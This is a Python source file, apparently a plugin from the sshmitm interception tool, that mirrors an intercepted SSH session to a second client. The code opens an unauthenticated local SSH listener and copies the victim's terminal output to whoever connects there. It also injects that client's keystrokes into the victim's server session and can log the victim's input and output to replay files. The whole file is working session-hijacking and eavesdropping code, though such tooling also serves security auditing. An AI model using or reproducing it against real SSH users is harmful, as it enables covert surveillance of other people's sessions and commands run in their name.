import datetime
import logging
import select
import threading
import socket
import time
import os
import tempfile
from typing import (
    Optional,
    IO
)

import pytz

from colored.colored import stylize, attr, fg  # type: ignore
from rich._emoji_codes import EMOJI
import paramiko

import sshmitm
from sshmitm.forwarders.ssh import SSHForwarder


class InjectServer(paramiko.ServerInterface):

    def __init__(self, server_channel: paramiko.channel.Channel) -> None:
        self.server_channel = server_channel
        self.injector_channel: Optional[paramiko.channel.Channel] = None

    def check_auth_none(self, username: str) -> int:
        return paramiko.common.AUTH_SUCCESSFUL

    def check_channel_request(self, kind: str, chanid: int) -> int:
        if kind == 'session':
            return paramiko.common.OPEN_SUCCEEDED
        return paramiko.common.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_channel_shell_request(self, channel: paramiko.channel.Channel) -> bool:
        self.injector_channel = channel
        return True

    def check_channel_pty_request(
        self,
        channel: paramiko.channel.Channel,
        term: bytes,
        width: int,
        height: int,
        pixelwidth: int,
        pixelheight: int,
        modes: bytes
    ) -> bool:
        return True


class SSHMirrorForwarder(SSHForwarder):
    """Mirrors the shell to another client
    """

    HOST_KEY_LENGTH = 2048

    @classmethod
    def parser_arguments(cls) -> None:
        plugin_group = cls.parser().add_argument_group(cls.__name__)
        plugin_group.add_argument(
            '--ssh-mirrorshell-net',
            dest='ssh_mirrorshell_net',
            default='127.0.0.1',
            help='local address/interface where injector sessions are served'
        )
        plugin_group.add_argument(
            '--ssh-mirrorshell-key',
            dest='ssh_mirrorshell_key'
        )
        plugin_group.add_argument(
            '--store-ssh-session',
            dest='store_ssh_session',
            action='store_true',
            help='store ssh session in scriptreplay format'
        )

    def __init__(self, session: 'sshmitm.session.Session') -> None:
        super().__init__(session)
        if self.args.ssh_mirrorshell_key:
            self.args.ssh_mirrorshell_key = os.path.expanduser(self.args.ssh_mirrorshell_key)

        self.logdir: Optional[str] = None
        self.timestamp: Optional[datetime.datetime] = None
        self.file_stdin: Optional[IO[bytes]] = None
        self.file_stdout: Optional[IO[bytes]] = None
        self.timeingfile: Optional[IO[bytes]] = None
        self._init_files()

        self.injector_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.injector_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.injector_sock.bind((self.args.ssh_mirrorshell_net, 0))
        self.injector_sock.listen(5)
        self.inject_server: Optional[InjectServer] = None

        self.injector_client_sock: Optional[socket.socket] = None

        self.conn_thread = threading.Thread(target=self.injector_connect)
        self.conn_thread.start()

    def _init_files(self) -> None:
        if not self.args.store_ssh_session:
            return
        if self.session.session_log_dir is None or self.session.username is None or self.session.remote_address is None:
            return
        try:
            self.logdir = os.path.join(
                self.session.session_log_dir,
                f"terminal_{self.session.username}@{self.session.remote_address[0]}"
            )

            os.makedirs(self.logdir, exist_ok=True)
            timecomponent = str(time.time()).split('.', maxsplit=1)[0]

            self.file_stdin = tempfile.NamedTemporaryFile(  # pylint: disable=consider-using-with
                prefix=f'ssh_in_{timecomponent}_',
                suffix='.log',
                dir=self.logdir,
                delete=False
            )
            self.file_stdout = tempfile.NamedTemporaryFile(  # pylint: disable=consider-using-with
                prefix=f'ssh_out_{timecomponent}_',
                suffix='.log',
                dir=self.logdir,
                delete=False
            )
            self.file_stdout.write(
                "Session started on {}\n".format(  # pylint: disable=consider-using-f-string
                    datetime.datetime.utcnow().replace(
                        tzinfo=pytz.utc
                    ).strftime("%a %d %b %Y %H:%M:%S %Z")
                ).encode()
            )
            self.file_stdout.flush()
            self.timeingfile = tempfile.NamedTemporaryFile(  # pylint: disable=consider-using-with
                prefix=f'ssh_time_{timecomponent}_',
                suffix='.log',
                dir=self.logdir,
                delete=False
            )
        except Exception:  # pylint: disable=broad-exception-caught
            logging.exception("Error file init")

    def write_timingfile(self, text: bytes) -> None:
        if self.timeingfile is None:
            return
        if self.timestamp is None:
            self.timestamp = datetime.datetime.now()
        oldtime = self.timestamp
        self.timestamp = datetime.datetime.now()
        diff = self.timestamp - oldtime
        self.timeingfile.write(f"{diff.seconds}.{diff.microseconds} {len(text)}\n".encode())
        self.timeingfile.flush()

    def injector_connect(self) -> None:
        inject_host, inject_port = self.injector_sock.getsockname()
        logging.info(
            "%s created mirrorshell on port %s. connect with: %s",
            EMOJI['information'],
            inject_port,
            stylize(f'ssh -p {inject_port} {inject_host}', fg('light_blue') + attr('bold'))
        )
        try:
            while self.session.running:
                readable = select.select([self.injector_sock], [], [], 0.5)[0]
                if len(readable) == 1 and readable[0] is self.injector_sock:
                    try:
                        self.injector_client_sock, _ = self.injector_sock.accept()
                    except socket.error:
                        break

                    mirror_transport = paramiko.Transport(self.injector_client_sock)
                    mirror_transport.set_gss_host(socket.getfqdn(""))

                    mirror_transport.load_server_moduli()
                    if self.args.ssh_mirrorshell_key:
                        mirror_transport.add_server_key(paramiko.RSAKey(filename=self.args.ssh_mirrorshell_key))
                    else:
                        mirror_transport.add_server_key(paramiko.RSAKey.generate(bits=self.HOST_KEY_LENGTH))

                    self.inject_server = InjectServer(self.server_channel)
                    event = threading.Event()
                    mirror_transport.start_server(event=event, server=self.inject_server)
                    injector_channel = None
                    while not injector_channel:
                        injector_channel = mirror_transport.accept(0.5)
                    event.wait()
                    while True:
                        if self.inject_server.injector_channel and self.inject_server.injector_channel.recv_ready():
                            buf = self.inject_server.injector_channel.recv(self.BUF_LEN)
                            self.server_channel.sendall(buf)
                        else:
                            time.sleep(0.1)

        except Exception:  # pylint: disable=broad-exception-caught
            logging.exception("mirrorshell - injector connection suffered an unexpected error")
            if self.channel is not None:
                self.close_session(self.channel)

    def close_session(self, channel: paramiko.Channel) -> None:
        super().close_session(channel)
        self.injector_sock.close()
        if self.inject_server is not None and self.inject_server.injector_channel is not None:
            self.inject_server.injector_channel.get_transport().close()
        self.conn_thread.join()
        if self.logdir:
            if self.timeingfile is not None:
                self.timeingfile.close()
            if self.file_stdout is not None:
                self.file_stdout.close()
            if self.file_stdin is not None:
                self.file_stdin.close()

    def forward_stdin(self) -> None:
        if self.session.ssh_channel is not None and self.session.ssh_channel.recv_ready():
            buf = self.session.ssh_channel.recv(self.BUF_LEN)
            if self.logdir is not None and self.file_stdin is not None:
                self.file_stdin.write(buf)
                self.file_stdin.flush()
            buf = self.stdin(buf)
            self.server_channel.sendall(buf)

    def forward_stdout(self) -> None:
        if self.server_channel.recv_ready():
            buf = self.server_channel.recv(self.BUF_LEN)
            if self.logdir is not None and self.file_stdout is not None:
                self.file_stdout.write(buf)
                self.file_stdout.flush()
                self.write_timingfile(buf)
            buf = self.stdout(buf)
            if self.session.ssh_channel is not None:
                self.session.ssh_channel.sendall(buf)
            if self.inject_server is not None and self.inject_server.injector_channel is not None:
                self.inject_server.injector_channel.sendall(buf)

    def forward_stderr(self) -> None:
        if self.server_channel.recv_stderr_ready():
            buf = self.server_channel.recv_stderr(self.BUF_LEN)
            if self.logdir is not None and self.file_stdout is not None:
                self.file_stdout.write(buf)
                self.file_stdout.flush()
                self.write_timingfile(buf)
            buf = self.stderr(buf)
            if self.session.ssh_channel is not None:
                self.session.ssh_channel.sendall_stderr(buf)
            if self.inject_server is not None and self.inject_server.injector_channel is not None:
                self.inject_server.injector_channel.sendall(buf)
